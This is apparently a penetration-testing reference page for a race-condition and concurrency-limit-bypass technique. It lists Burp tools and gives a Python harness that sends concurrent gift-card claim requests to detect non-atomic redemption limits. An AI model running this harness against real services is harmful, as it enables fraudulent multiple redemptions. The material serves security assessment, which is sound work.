# Tools, CLI Flags, and SDK Reference

> Sub-skill: [`race-conditions-and-concurrency-limit-bypass`](SKILL.md) | Family: **Web and Application**

Flags below are the ones this technique actually needs. Verify with `--help` on your installed version before relying on an exact spelling.

## Tool and Command Matrix

| Tool / Package | Verified Command or Entry Point | Purpose | Platforms |
|---|---|---|---|
| `Turbo Intruder` | `Load the single-packet race template and set the redemption endpoint and test code` | Delivers the aligned burst needed to land inside the redemption window | Cross-platform |
| `Burp Suite Repeater` | `Group the claim requests and send in parallel on a single connection` | Reproduces a small burst against the test coupon without scripting | Cross-platform |
| `curl` | `curl -sS 'https://target.example/gift-card/TEST/status'` | Reads the committed redemption count on the test asset between bursts | Cross-platform |

## Minimal Script Shape

A limit-bypass harness: it fires concurrent claims of a disposable gift-card code from a thread pool and reports the number of credited responses, so a count above one flags a non-atomic ceiling.

```python
import concurrent.futures
import urllib.request

CLAIM = "https://target.example/gift-card/claim"
CODE = "ASSESSOR-TEST-CARD"
N = 15

def claim(_):
    data = ("code=" + CODE).encode()
    req = urllib.request.Request(CLAIM, data=data, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return b"credited" in r.read()
    except Exception:
        return False

with concurrent.futures.ThreadPoolExecutor(max_workers=N) as pool:
    outcomes = list(pool.map(claim, range(N)))

credited = sum(1 for ok in outcomes if ok)
print({"concurrent_claims": N, "credited_responses": credited,
       "verdict": "limit-bypass" if credited > 1 else "ceiling-held"})
```
